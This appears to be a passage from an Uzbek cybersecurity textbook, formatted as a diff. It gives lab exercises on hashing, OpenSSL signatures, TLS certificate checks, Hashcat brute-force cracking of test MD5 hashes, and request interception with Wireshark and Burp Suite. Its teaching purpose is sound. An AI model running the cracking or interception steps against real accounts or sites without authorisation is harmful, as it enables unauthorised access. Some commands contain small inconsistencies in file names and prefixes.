+Demak barcha xesh funksiyalar ma’lumot buzilganligini ko‘rsatmoqda (chunki xesh qiymatlar oldingisiga nisbatan tubdan farq qilmoqda). Agar ma’lumotni asliga qaytarib (4.20-rasm) yana xesh qiymatlarni hisoblasak, xesh qiymat dastlabki holatiga qaytganligini ko‘rish mumkin (4.21-rasm).
+
+4.20-rasm. Ma’lumotni dastlabki holatga qaytarish
+
+4.21-rasm. Dastlabki xesh qiymatlar
+		Laboratoriya muhitida Windows OTda OpenSSlni sozlab, test faylini yarating va MD5/SHA-256 algoritmlari yordamida xesh qiymatlarini hisoblang.
+	•	Faylni o‘zgartirib, yaxlitlikni tekshiring va natijalarni jadvalda ko‘rsating.
+	•	Barcha olingan natijalarini faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida Windows OTda OpenSSlni sozlab, test faylini yarating va MD5/SHA-256 algoritmlari yordamida xesh qiymatlarini hisoblang.
+	•	Faylni o‘zgartirib, yaxlitlikni tekshiring va natijalarni jadvalda ko‘rsating.
+	•	Barcha olingan natijalarini faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+
+
+
+4.4. Kriptografik algoritmlardan real hayotda foydalanish
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda elektron raqamli imzo sertifikatini yaratish va uni haqiqiyligini tekshirish bo‘yicha ko‘nikmalarni shakllantirishdan iborat.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda elektron raqamli imzo sertifikatini yaratish va uni haqiqiyligini tekshirish bo‘yicha ko‘nikmalarni shakllantirishdan iborat.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Terminal oynasi;
+	•	OpenSSL kutubxonasi.
+
+	•	Shaxsiy kompyuter;
+	•	Terminal oynasi;
+	•	OpenSSL kutubxonasi.
+
+Ishning bajarish tartibi
+Raqamli sertifikat (digital certificate) - bu ochiq kalitlar infratuzilmasi (PKI)ning asosiy qismi bo‘lib, ochiq kalitni shaxs yoki tashkilotga bog‘laydi. Elektron raqamli imzo (digital signature) esa hujjatning haqiqiyligini va o‘zgartirilmaganligini ta’minlaydi. Ushbu laboratoriyada OpenSSL yordamida o‘z-o‘zi tomonidan imzolangan sertifikatni yaratamiz, hujjatni imzolaymiz va tekshiramiz.
+Windows OTga OpenSSLni o‘rnatish va ishga tushurish. Buning uchun rasmiy saytdan dasturni Lite versiyasini yuklab olib o‘rnating (4.22-rasm) (https://slproweb.com/products/Win32OpenSSL.html), o‘rnatishda “Add OpenSSL to PATH” bandini belgilang.
+
+4.22-rasm. OpenSSLni o‘rnatish
+Dasturdan foydalanishda qulaylik yaratish uchun C diskda “Raqamli sertifikat” degan papka yaratib olamiz va dasturni shu papka ichida ishga tushuramiz (4.23-rasm).
+
+4.23-rasm. Kerakli papkani yaratib olish
+Openssl kutubxonasidan  foydalanish uchun cmd buyrug‘idan foydalaniladi (ПУСК va R tugmalari birgalikda bosiladi):
+4.24-rasm. Cmd buyrug‘ini ishga tushiriladi
+Cmd oynasidagi joriy papkasidan chiqish uchun cd.. buyrug‘idan foydalaniladi:
+
+4.25-rasm. cd.. buyrug‘idan foydalanish
+Openssl kutubxonasi uchun foydalanadigan Raqamli sertifikat papkasiga cd Raqamli sertifikat buyrug‘i orqali kiriladi va echo buyrug‘i orqali ochiq ma’lumot va fayl hosil qilinadi:
+
+4.26-rasm. Ochiq ma’lumot hosil qilish
+Hosil qilingan hujjat.txt fayli yaratilgan Raqamli sertifikat papkani ichiga tushadi.
+
+4.27-rasm. Ochiq ma’lumot joylashuvi va mazmuni
+Dasturni ishga tushurish uchun quyidagi buyruq kiritiladi (4.28-rasm):
+
+4.28-rasm. OpenSSLni ishga tushirish
+Endi sertifikat yaratish va tekshirish qadamlarini ko‘rib chiqamiz:
+1. Shaxsiy kalit (Private Key) yaratish. Shaxsiy kalitni yaratish uchun quyidagi buyruqni bajaring (4.29-rasm):
+openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048
+
+4.29-rasm. Shaxsiy kalitni generatsiya qilish
+Bu 2048-bitli RSA kalitini yaratadi va Raqamli sertifikat papkasida Shaxsiy_kalit.pem faylida saqlaydi (4.30-rasm).
+
+4.30-rasm. Shaxsiy kalit fayli
+2. Ochiq kalit (Public Key) yaratish. Shaxsiy kalitdan ochiq kalitni hosil qilish uchun quyidagi buyruqni kiriting (4.31-rasm):
+openssl pkey -in Shaxsiy_kalit.pem -pubout -out Ochiq_kalit.pem
+
+4.31-rasm. Ochiq kalit generatsiya qilish
+Natijada Ochiq_kalit.pem fayli hosil bo‘ladi (4.32-rasm).
+
+4.32-rasm. Ochiq kalit fayli
+3. Sertifikat hosil qilish. Shaxsiy kalit bilan imzolash orqali sertifikatni hosil qilish uchun quyidagi buruqdan foydalaning:
+req -x509 -new -nodes -key Shaxsiy_kalit.pem -sha256 -days 365 -out sertifikat.pem
+Buyruq vaqtida savollar chiqadi va so‘ralgan ma’lumotlarni kiritish talab etiladi (4.33-rasm).
+Bu 365 kun muddatli, SHA-256 algoritmli sertifikatni yaratadi. Natijada sertifikat.pem fayli hosil bo‘ladi (4.34-rasm).
+
+4.33-rasm. Sertifikat hosil qilish
+
+4.34-rasm. Sertifikat fayli
+Sertifikatni tekshirish. Sertifikat ma’lumotlarini ko‘rish va haqiqiyligini tekshirish uchun quyidagi buyruqlardan foydalaniladi:
+openssl x509 -in certificate.pem -text -noout
+Natijada sertifikat tafsilotlari chiqariladi (masalan, muddat, imzo) (4.35-rasm).
+Hujjatni raqamli imzo bilan imzolash. Test hujjatini yaratish uchun quyidagi buyruqdan foydalaniladi:
+echo «Imzolanuvchi hujjat matni» > hujjat.txt
+Hujjatni imzolash (4.36-rasm):
+openssl dgst -sha256 -sign Shaxsiy_kalit.pem -out imzolangan.sig hujjat.txt
+
+4.35-rasm. Sertifikat ma’lumotlari
+
+4.36-rasm. Hujjatni imzolash jarayoni
+Natijada imzolangan.sig imzo qo‘yilgan fayl hosil bo‘ladi (4.37-rasm).
+
+4.37-rasm. Imzolangan fayl
+Imzoni tekshirish. Imzoni ochiq kalit bilan tekshiring:
+dgst -sha256 -verify Ochiq_kalit.pem -signature imzolangan.sig hujjat.txt
+Agar “Verified OK” chiqsa, imzo haqiqiy. Hujjatni o‘zgartirib ko‘ring va qayta tekshiring, “Verification Failure” chiqadi (4.38-rasm).
+
+4.38-rasm. Imzoni haqiqiyligini tekshirish
+		Laboratoriya muhitida OpenSSL yordamida 4096 bitli RSA shaxsiy kalitni yarating va ochiq kalitni hosil qilish jarayonlarini amalga oshiring.
+	•	365 kunlik raqamli imzo sertifikatini yarating va sertifikatni tekshiring.
+	•	Barcha olingan natijalarini faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida OpenSSL yordamida 4096 bitli RSA shaxsiy kalitni yarating va ochiq kalitni hosil qilish jarayonlarini amalga oshiring.
+	•	365 kunlik raqamli imzo sertifikatini yarating va sertifikatni tekshiring.
+	•	Barcha olingan natijalarini faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+
+
+
+
+
+4.5. HTTPS va SSL/TLS sertifikatlarini tekshirish
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda SSL/TLS sertifikati tahlil etish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda SSL/TLS sertifikati tahlil etish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Internetga ulangan kompyuter;
+	•	Brauzer (Google Chrome yoki Firefox);
+	•	Kali Linux OT;
+	•	OpenSSL kutubxonasi.
+
+	•	Internetga ulangan kompyuter;
+	•	Brauzer (Google Chrome yoki Firefox);
+	•	Kali Linux OT;
+	•	OpenSSL kutubxonasi.
+
+
+Ishning bajarish tartibi
+HTTPS (HyperText Transfer Protocol Secure) web-saytlar bilan xavfsiz aloqani ta’minlaydi va SSL/TLS protokollari asosida ishlaydi. SSL/TLS sertifikati server identifikatsiyasini tasdiqlaydi, shifrlashni amalga oshiradi va MITM (Man-in-the-Middle) hujumlaridan himoya qiladi.
+SSL/TLS sertifikati:
+	•	web-sayt haqiqiy ekanini tasdiqlaydi;
+	•	ma’lumotlar shifrlanishini ta’minlaydi.
+Agar sertifikat bo‘lmasa parollar, login ma’lumotlari, karta raqamlari xavf ostida qoladi.
+1-qadam. HTTPS mavjudligini tekshirish. Internetga ulangan kompyuterning brauzerini ochamiz va manzil satriga quyidagini yozamiz:
+https://google.com
+Manzil yonida 🔒, qulf belgisi chiqadi bu sayt HTTPS orqali himoyalanganligini bildiradi.
+2-qadam. SSL/TLS sertifikatini ko‘rish:
+	•	Brauzerda qulf belgisi ustiga bosamiz.
+	•	Sertifikat bandini tanlaymiz.
+
+4.39-rasm. HTTPS mavjudligini tekshirish
+Ko‘rinadigan ma’lumotlar:
+	•	Sertifikat egasi (Issued to);
+	•	Kim bergani (Issued by);
+	•	Amal qilish muddati (Valid from / to).
+Bu orqali saytning ishonchliligi tekshiriladi.
+3-qadam. Sertifikat muddati va ishonchliligini tahlil qilish. Sertifikatning amal qilish muddati tugamaganini va sertifikatni bergan tashkilot (Google Trust Services) ni tekshiramiz hamda ishonchli ekanini aniqlaymiz (4.40-rasm).
+
+4.40-rasm. SSL/TLS sertifikatini ko‘rish
+Agar sertifikat muddati tugagan bo‘lsa, bu xavfsizlik xatoligi hisoblanadi.
+4-qadam. HTTPS va HTTP protokollarini taqqoslash. Brauzerda quyidagi manzilni ochamiz:
+http://example.com
+Manzil yonida 🔒 qulf belgisi chiqmaydi aksincha “Not Secure” (Xavfsiz emas) degan yozuv chiqadi bu sayt HTTPS orqali himoyalanmaganligini bildiradi.
+HTTP aloqa kanali esa shifrlanmagan va xavfsiz emas hisoblanadi.
+
+4.41-rasm. HTTPS va HTTP ni solishtirish
+Sertifikatlarni tekshirish uchun Linux OT muhitida OpenSSL kutubxonasidan foydalanish ham mumkin:
+1-qadam. Kali OTni ishga tushiring va terminalni oching. Tizimni yangilang: “sudo apt update && sudo apt upgrade” (parolni kiriting). OpenSSL ni o‘rnating: “sudo apt install openssl” (4.42-rasm).
+
+4.42-rasm. OpenSSL ni o‘rnatish
+2-qadam. OpenSSL orqali sertifikatni tekshirish. OpenSSL server bilan TLS aloqa o‘rnatib, sertifikatni oladi:
+	•	Test sayt: google.com. Terminalda “openssl s_client -connect google.com:443 -servername google.com” buyrug‘ini kiriting. Bu server bilan aloqa o‘rnatadi va sertifikat zanjirini chiqaradi.
+	•	Natijadan “Certificate chain” bo‘limini toping, bu sertifikat beruvchi markazlar zanjirini ko‘rsatadi (eng pastki qatlamdan (leaf) root CA gacha) (4.43-rasm).
+
+4.43-rasm. google.com saytini sertifikatini tekshirish
+	•	“Verify return code: 0 (ok)” chiqsa, sertifikat haqiqiy va ishonchli. Agar xato chiqsa (masalan, “self signed” yoki “expired”), muammo borligini bildiradi.
+
+4.44-rasm. google.com saytini sertifikatini haqiqiyligiga ishonch hosil qilish
+
+4.45-rasm. Sertifikat ma’lumotlarini batafsil ko‘rish
+3-qadam. Sertifikat ma’lumotlarini batafsil ko‘rish. Sertifikatni alohida tahlil qilish (4.45-rasm):
+	•	Sertifikatni saqlash: “openssl s_client -connect google.com:443 -servername google.com -showcerts </dev/null | openssl x509 -text -noout” – bu faqat leaf sertifikatni chiqaradi.
+Leaf sertifikat - siz saytga kirganda brauzer qulf belgisini ko‘rsatadigan, domen nomiga tegishli bo‘lgan asosiy sertifikatdir.
+	•	Ma’lumotlarni tahlil qiling: Issuer (kim bergan), Subject (kim uchun), Validity (Not Before/Not After – muddati), Subject Alternative Name (SAN – qaysi domenlar uchun), Public Key Algorithm (RSA yoki ECDSA) parametrlari haqidagi ma’lumotlarni aniqlang.
+
+		Laboratoriya muhitida Kali OTni virtual mashinada sozlab, kamida 3 ta sayt (google.com, yandex.com, badssl.com subdomainlari) sertifikatini OpenSSL va brauzer orqali tekshiring.
+	•	Sertifikat muddati, bergan tashkilot va TLS versiyasini hamda HTTP va HTTPS farqini yozib jadvalda ko‘rsating.
+	•	Barcha olingan natijalarini faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida Kali OTni virtual mashinada sozlab, kamida 3 ta sayt (google.com, yandex.com, badssl.com subdomainlari) sertifikatini OpenSSL va brauzer orqali tekshiring.
+	•	Sertifikat muddati, bergan tashkilot va TLS versiyasini hamda HTTP va HTTPS farqini yozib jadvalda ko‘rsating.
+	•	Barcha olingan natijalarini faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+4.6. Parol xeshlash va brute force hujumlari
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda parollarni aniqlash bo‘yicha ko‘nikmalarni shakllantirishdan iborat.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda parollarni aniqlash bo‘yicha ko‘nikmalarni shakllantirishdan iborat.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Hashcat dasturi;
+	•	OpenSSL kutubxonasi.
+
+	•	Shaxsiy kompyuter;
+	•	Hashcat dasturi;
+	•	OpenSSL kutubxonasi.
+
+
+Ishning bajarish tartibi
+Parol - bu tizimga kirish uchun ishlatiladigan maxfiy belgilar to‘plami. Parolning kuchliligi uning uzunligi, ishlatilgan belgilar to‘plami (alfavit) va murakkabligiga bog‘liq. Barcha variantlarni hisoblash, qo‘pol kuch (brute force) hujumi - bu parolni barcha mumkin bo‘lgan kombinatsiyalarni sinab ko‘rish orqali topish usuli. Matematik jihatdan, agar parol uzunligi L bo‘lsa va alfavit o‘lchami A (masalan, 26 harf) bo‘lsa, jami variantlar soni  ga teng.
+Brute force — parolni barcha ehtimoliy variantlarni tekshirib topish usuli.
+Brute force samaradorligi:
+	•	Parol uzunligi oshsa → variantlar keskin ko‘payadi;
+	•	Belgilar to‘plami kengaysa → murakkablik oshadi;
+	•	Zamonaviy GPUlar sekundiga millionlab parollarni tekshiradi.
+Ma’lumki parollar tizimda xesh qiymat ko‘rinishida saqlanadi, agar xesh qiymat ochilsa parol ham buziladi. Ushbu laboratoriya ishida misol sifatida faylda yozilgan xesh qiymat ortida qanday parol yashirilganligini aniqlash jarayonlari amalga oshiriladi. Buning uchun bizga Hashcat dasturi kerak bo‘ladi.
+Hashcat - bu ochiq kodli (MIT litsenziyasi), GPU va CPU tezlashtirilgan parol “aniqlash” vositasi bo‘lib, qo‘pol kuch, lug‘atga asoslangan hujum (dictionary attack) va gibrid hujumlar uchun ishlatiladi. Jarayon qadamlari quyidagicha:
+1. Hashcat dasturini yuklab olish (rasmiy saytdan yuklab oling: https://hashcat.net/hashcat/; so‘nggi versiya, masalan, v7.1.2) (4.46-rasm).
+2. Yuklab olingan faylni arxivdan chiqarib hashcat deb papka ochib ichiga saqlab qo‘ying (4.47-rasm).
+
+4.46-rasm. Hashcat dasturini yuklab olish
+
+4.47-rasm. Arxivdan chiqarish va papkaga joylashtirish
+3. Dasturni tekshirib ko‘rish uchun cmd oynasini ochib, dastur turgan papkaga o‘tib, hashcat --version buyrug‘ini kiritamiz. Agar ishlasa, versiya haqidagi ma’lumot chiqadi (4.48-rasm).
+
+4.48-rasm. Dasturni versiyasini tekshirish
+4. Test uchun xesh fayl yaratish. Parol sifatida abc deb olib, uni xesh qiymatini hisoblab test_hash.txt faylni ichiga yozamiz va faylni hashcat papkasiga saqlab qo‘yamiz (4.50-rasm). Xesh qiymatni hisoblash uchun oldingi laboratoriya ishida o‘rgangan bilimlarizdan foydalaning, ya’ni OpenSSl orqali (4.49-rasm).
+
+4.49-rasm. Test uchun parolni tanlash
+
+4.50-rasm. Qidirilayotgan parolni xesh qiymati va papkaga joylashtirilishi
+5. Brute Force hujumini boshlash. Buyruq satrida Hashcat papkasiga o‘ting va 3-belgili kichik harflardan (a-z) iborat parollarni sinab ko‘ring (4.51-rasm):
+hashcat -m 0 -a 3 test_hash.txt ?l?l?l
+	•	-m 0: Hash turi (MD5). Boshqa turlar uchun hashcat --help ga qarang.
+	•	-a 3: Mask attack (brute force uchun).
+	•	?l?l?l: Mask - ?l kichik harf, 3 ta belgi. Boshqa masklar: ?u (katta harf), ?d (raqam), ?s (maxsus belgi), ?a (hamma). 
+Natija topilganda parol cjop etiladi (masalan, “abc”). Sessiyani to‘xtatish uchun Ctrl+C, davom ettirish uchun qayta ishga tushiring.
+
+4.51-rasm. Hujumni amalga oshirish va natija
+Endi parolga raqamlarni qo‘shib ham sinab ko‘ramiz. Parolni abc12 deb o‘zgartirib qaytadan hujumni amalga oshirib ko‘ramiz (4.52-rasm). Buyruq matniga raqamni ya’ni, ?d ham qo‘shamiz:
+hashcat -m 0 -a 3 test_hash.txt ?l?l?l?d?d
+
+4.52-rasm. Hujumni amalga oshirish va natija
+		Laboratoriya muhitida OpenSSL yordamida Abs123 parolini xesh qiymatini hisoblang.
+	•	Hashcat yordamida xesh qiymat parolini ochish jarayonlarini amalga oshiring.
+	•	Ochilgan parol va parol murakkabligi bo‘yicha xulosa natijalarini faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida OpenSSL yordamida Abs123 parolini xesh qiymatini hisoblang.
+	•	Hashcat yordamida xesh qiymat parolini ochish jarayonlarini amalga oshiring.
+	•	Ochilgan parol va parol murakkabligi bo‘yicha xulosa natijalarini faylga saqlab, skrinshotlar bilan birga hisobot tayyorlang.
+Amaliy topshiriqlar
+
+V BOB. WEB XAVFSIZLIK VA ETHICAL HACKING ASOSLARI
+
+
+V BOB. WEB XAVFSIZLIK VA ETHICAL HACKING ASOSLARI
+
+
+
+
+
+
+
+5-bob haqida umumiy ma’lumot
+Mazkur bobda web saytlar qanday ishlashi, web tizimlarda keng tarqalgan zaifliklar, xususan OWASP TOP 10 zaifliklari, etik xakerlik va uning qonuniy asoslarini belgilash, SQL inyeksiya va XSS kabi keng tarqalgan web hujumlarni amalga oshirish va aniqlash, penetration testing jarayonini simulyatsiya qilish, web-saytlardagi zaifliklarni skanerlash, web saytlar xavfsizligini ta’minlashda keng foydalaniluvchi vositalar nazariy va amaliy jihatidan tushuntiriladi.
+5.1. Web saytlar qanday ishlaydi?
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda web so‘rovlarni tutib olish va tahlil qilish ko‘nikmasin shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda web so‘rovlarni tutib olish va tahlil qilish ko‘nikmasin shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Wireshark dasturi;
+	•	Burp Suite dasturi.
+
+	•	Shaxsiy kompyuter;
+	•	Wireshark dasturi;
+	•	Burp Suite dasturi.
+
+Ishning bajarish tartibi
+Web so‘rovlar (HTTP/HTTPS) – bu mijoz (masalan, brauzer) va server o‘rtasidagi aloqa protokoli bo‘lib, web-saytlar, APIlar va mobil ilovalar ishlaydigan asosiy mexanizm hisoblanadi.
+So‘rovlarni tutib olish va tahlil qilish web tizimlarni ishlab chiqishdagi xatolarni topish (debugging), optimizatsiya (vaqt va resurslarni o‘lchash), xavfsizlik testlari (vulnerability scanning, injection hujumlari) va API integratsiyasi uchun muhim. HTTPS (shifrlangan) so‘rovlarni tahlil qilish uchun deshifrlash kerak (masalan, proxy orqali yoki SSL key log ilovasidan foydalanib). Bu usullar faqat o‘quv va qonuniy maqsadlarda ishlatilishi kerak. Real tarmoqlarda esa ruxsatsiz tahlillarni olib borish qonunga zid hisoblanadi.
+Quyidagi vositalar orqali ushbu jarayonlarni amalga oshirish mumkin:
+1. Brauzer Developer Tools (masalan, Chrome DevTools):
+Vazifasi. Web-sayt yuklanishi jarayonida yuzaga keladigan HTTP/ HTTPS so‘rovlarni real vaqtda tutib olish va tahlil qilishdan iborat. U shuningdek, debuggerlash, amalga oshirilishni o‘lchash va resurslarni ko‘rish uchun xizmat qiladi.
+Ishlash prinsipi. Brauzer ichida integratsiyalashgan vosita bo‘lib, tarmoqdan keladigan so‘rovlarni tartiblaydi. Har bir so‘rov uchun, sarlavhalar, ma’lumot, berilgan javob va vaqtni ko‘rsatadi. Kesh xotirani o‘chirib, yangi so‘rovlarni tutib oladi.
+2. Wireshark:
+Vazifasi. Tarmoq paketlarini (shu jumladan, HTTP/ HTTPS) tutib olish va batafsil tahlil qilishga mo‘ljallangan. Xavfsizlik mutaxassislari va tarmoq ma’murlari uchun qulay vosita hisoblanadi.
+Ishlash prinsipi. Tarmoq interfeysini (Wi-Fi, Ethernet) monitoring qilib, barcha paketlarni tutib oladi. Filtrlar (masalan, “http.request”) orqali HTTP so‘rovlarni ajratib oladi. Paketni qismlarga ajratib, har bir qatlam uchun tegishli qismlar (Ethernet, IP, TCP, HTTP) ni ko‘rsatadi. HTTPS oqimini deshifrlash imkonini beradi.
+3. Burp Suite:
+Vazifasi. Web ilovalar xavfsizligini testlash, so‘rovlarni tutib olib, zaifliklarni skanerlash va penetration testlarini amalga oshirish uchun mo‘ljallangan. U xakerlar va pentesterlar uchun asosiy vositalardan hisoblanadi.
+Ishlash prinsipi. Proxy orqali trafikni tutib oladi (Burp Proxy). Unda mavjud vositalar: Skaner (avtomatik zaifliklarni topish), Buzib kirish (qo‘pol kuch hujumini amalga oshirish uchun), Takrorlash (so‘rovni takrorlash va o‘zgartirish uchun), Ketma-ketlik (tasodifiylikni tahlil qilish uchun). Bundan tashqari, ushbu vosita so‘rovni o‘rtada tutib olib, o‘zgartirib yuborish mumkin (masalan, inyeksiya testlari uchun).
+Endi har bir holatni amalda tadbiqi masalasiga to‘xtalib o‘tamiz:
+1. Brauzer Developer Tools orqali. Chrome brauzerini ochib, F12 tugmasini bosing va Tarmoq (Network) bo‘limiga o‘ting. “Preserve log” va “Disable cache” bandlarini yoqing. Biror saytni oching, masalan: https://httpbin.org/forms/post (bu saytda oddiy forma mavjud: ism, familiya, email va hk.). Saytdagi formani to‘ldiring, masalan:
+	•	Customer name: “Test User”;
+	•	Custtel: “123456789”;
+	•	Custemail: “test@example.com”;
+	•	Size: “small” (radio button);
+	•	Topping: “bacon” (checkbox);
+	•	Delivery: “12:00” (time);
+	•	Comments: “Test comment”.
+Keyin “Submit” tugmasini bosing va shundan so‘ng forma ma’lumotlari POST so‘rovi orqali yuboriladi. Shu bilan birga tarmoq bo‘limida yangi so‘rov paydo bo‘ladi (masalan, nomi “post” yoki “forms/post”) (5.1-rasm).
+
+5.1-rasm. So‘rov yuborish va uni tutib olish (o‘ng tomonda post so‘rov paydo bo‘ldi)
+Payloadni tekshirish. Network bo‘limida paydo bo‘lgan POST so‘rovni bosib oching (masalan, “post” nomli qatorni sichqoncha bilan bosing). Quyidagi bo‘limlarni ko‘rish mumkin:
+	•	Headers bo‘limi:
+	•	General: So‘rov metodi (Request Method: POST), URL (masalan, https://httpbin.org/post), Status Code (200 OK bo‘lsa, muvaffaqiyatli).
+	•	Request Headers: Sarlavhalar, masalan:
+Content-Type: application/x-www-form-urlencoded (forma ma’lumotlari uchun odatiy).
+User-Agent: Brauzer haqida ma’lumot.
+Content-Length: Payload hajmi.
+	•	Response Headers: Server javobi sarlavhalari (masalan, Server: gunicorn) (5.2-rasm).
+	•	Payload bo‘limi (yoki Form Data / Request Payload):
+	•	Bu yerda yuborilgan ma’lumotlar ko‘rinadi. Misol uchun (5.3-rasm):
+custname=Test+User&custtel=123456789&custemail=test%40example.com&size=small&topping=bacon&delivery=12%3A00&comments=Test+comment
+	•	Bu URL kodlangan formatda (bo‘sh joylar + bilan, maxsus belgilar % bilan kodlangan) bo‘ladi.
+	•	Ajratilgan (Parsed) ko‘rinishida: Har bir maydon alohida ko‘rsatiladi, masalan:
+custname: Test User;
+custtel: 123456789 va hk.
+ 
+5.2-rasm. Headers bo‘limi
+	•	Agar forma JSON formatida bo‘lsa (masalan, API uchun), ma’lumot (payload) qismi JSON obyekti ko‘rinishida bo‘ladi:
+{«name»: «Test User», «email»: «test@example.com»}
+
+5.3-rasm. Payload qismi
+	•	Response bo‘limi: Server javobi.
+	•	Timing bo‘limi: So‘rov vaqti (masalan, DNS lookup, ulanish vaqti).
+2. Wireshark orqali. Wireshark ilovasi – bu kompyuterning tarmoq interfeysi orqali o‘tadigan trafikni tahlil qilish uchun ishlatilishi mumkin bo‘lgan tarmoqni tahlillovchi vositalardan biridir. Tarmoq muammolarini aniqlash va ularni yechish, web-ilovalar, tarmoq dasturlari yoki saytlarni tahlillash vazifasini bajaradi. Wireshark barcha darajadagi paketlar tarkibini to‘liq ko‘rish imkonini beradi.
+
+5.4-rasm. TCP paketi tahlil natijalari
+
+5.5-rasm. TCP paketi tahlilini to‘xtatish
+Faqat TCP paket tahlilini amalga oshirish uchun Wireshark ilovasi ishchi oynasining qidiruv bo‘limiga TCP paketi nomi yoziladi va “enter” tugmasi bosiladi. Paketlarni yozib olishni to‘xtatish uchun Wireshark ilovasidan panelidagi tegishli qizil tugma bosiladi (5.5-rasm). TCP protokoli tahlil qilinib bo‘lgandan keyin, uni saqlab qo‘yiladi.
+
+5.6-rasm. TCP paketi tahlil natijalarini saqlash oyansi
+3. Burp Suite orqali. Burp Suite ilovasi Java dasturlash tili asosida yaratilgan, web-ilovalarni penetratsion sinovdan o‘tkazish uchun mo‘ljallangan keng qamrovli frameworkdir. U web va mobil ilovalarni, shu jumladan APIlardan foydalanadigan tizimlarni qo‘lda tekshirish uchun standart darajadagi vosita hisoblanadi.
+Oddiy qilib aytganda, Burp Suite brauzer va web-server o‘rtasidagi barcha HTTP/HTTPS trafikasini ushlab qoladi va uni tahrirlash imkonini beradi. Mana shu asosiy imkoniyat tizimning poydevori hisoblanadi. So‘rov (request)larni to‘xtatib turish orqali foydalanuvchi ularni Burp Suite tarkibidagi turli komponentlarga yuborishi mumkin (bularni keyingi bo‘limlarda ko‘rib chiqamiz).
+Burp Suite vositasi so‘rovlarni serverga yetib borishidan oldin ko‘rish, o‘zgartirish yoki hatto javoblarni (response) brauzerimizga kelishidan oldin manipulyatsiya qilish imkoniyatini beradi.
+Burp Suite Community versiyasi quyidagi imkoniyatlarga ega:
+Burp Proxy - Burp Suitening eng mashhur qismi. U brauzer va web-ilova o‘rtasidagi so‘rov (request) va javoblarni (response) to‘xtatib turish, ko‘rish va tahrirlash imkonini beradi.
+Repeater - Takrorlagich ham juda mashhur vosita hisoblanadi. U bitta so‘rovni ushlab qolish, uni o‘zgartirish va bir necha bor qayta yuborish imkonini beradi.
+Intruder - Burp Suite Community versiyasida tezlik bo‘yicha cheklov bo‘lsada, o‘rtada suqiluvchi foydalanuvchi qurilmalariga ko‘plab so‘rovlar yuborish imkonini beradi. U quyidagi maqsadlarda keng qo‘llanadi: qo‘pol kuch hujumlarini amalga oshirishda va hk.
+Decoder - ma’lumotlarni kodlash yoki dekodlash uchun xizmat qiladi.
+Comparer - ikki ma’lumotni (so‘z darajasida yoki bayt darajasida) taqqoslashga imkon beradi. Boshqa vositalarda ham bu imkoniyat mavjud bo‘lsada, Burpda istalgan so‘rov yoki javobni bittagina tugmani bosish orqali Comparer vositasiga yuborish imkoniyati jarayonni ancha tezlashtiradi.
+Sequencer - odatda tokenlarning (masalan, sessiya cookie qiymatlari) tasodifiylik darajasini tekshirishda qo‘llanadi. Agar bu qiymatlarni yaratish algoritmi yetarlicha xavfsiz tasodifiylikka ega bo‘lmasa, bu jiddiy hujumlar uchun imkoniyat yaratadi.
+Burp Suitedan foydalanish. Burp Suiteni yuklab oling va o‘rnating hamda ishga tushiring. Burp Suiteni ishga tushirib, foydalanish shartlariga rozi bo‘lganingizdan keyin, sizdan loyiha turini tanlash so‘raladi. Burp Suite Community versiyasida variantlar cheklangan, shuning uchun davom etish uchun shunchaki “Next” tugmasini bosishingiz kifoya.
+Keyingi oynada Burp Suite uchun konfiguratsiyani tanlashingiz mumkin. Odatda, joriy (default) sozlamalarni qoldirish tavsiya etiladi va ular aksariyat holatlar uchun mos keladi. Start Burp tugmasini bosing va Burp Suite asosiy interfeysini oching.
+
+5.7-rasm. Dasturni ishga tushurish
+Keyingi qadamda Proxy bo‘limiga o‘ting va Intercept tanlovini yoqing.
+
+5.8-rasm. Proxy bo‘limi
+Open browser tugmasini bosib brauzerni oching va saytni yuklang (masalan amazon.com). Keyin so‘rovni bo‘lish mumkin bo‘ladi. Buning uchun tekshirish (inspect), o‘zgartirish (modify) va qayta yuborish (forward) tugmalari bosiladi.
+
+5.9-rasm. Tutib olingan web so‘rovlar
+Endi so‘rovlarni bemalol Repeater qismiga yuborib o‘zgartirib ko‘rish mumkin. Buning uchun ixtiyoriy so‘rovni ustiga sichqonchani o‘ng tugmasini bosing va “Send to Repeater” tugmasini bosgan holda yuboring. Keyin “Repeater” bo‘limiga o‘tsangiz so‘rov kelib tushganini ko‘rish mumkin.
+
+5.10-rasm. Tutib olingan so‘rovni Repeaterga yuborish
+
+5.11-rasm. Repeaterdan amazon serveriga so‘rov yuborish va kelgan javobni ko‘rish
+
+		Laboratoriya muhitida Brauzer Network bo‘limida GET va POST so‘rovni toping.
+	•	Wireshark yordamida HTTP trafikni aniqlash jarayonlarini amalga oshiring.
+	•	Burp Suite yordamida HTTPS login so‘rovini tutib oling va natijalarini faylga saqlab, skrinshotlar bilan asoslangan hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
